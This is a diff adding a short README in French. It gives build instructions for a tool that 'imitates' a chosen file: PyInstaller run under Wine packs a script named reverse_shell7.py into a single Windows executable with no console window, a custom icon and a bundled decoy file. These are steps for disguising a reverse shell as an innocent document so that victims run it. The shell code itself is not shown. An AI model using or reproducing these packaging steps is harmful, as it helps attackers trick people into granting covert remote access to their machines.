@@ -1,0 +1,7 @@
+Pour choisir le fichier à imiter :
+
+- En bas, dans file_name, remplacer dans les "\ " par le nom du fichier, il doit etre dans le répertoire courant
+
+Pour faire l'exécutable windows:
+
+wine /home/kamui/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "cheminversfichieraemuler;destination(mettre .)" --onefile --noconsole -i cheminversicone reverse_shell7.py
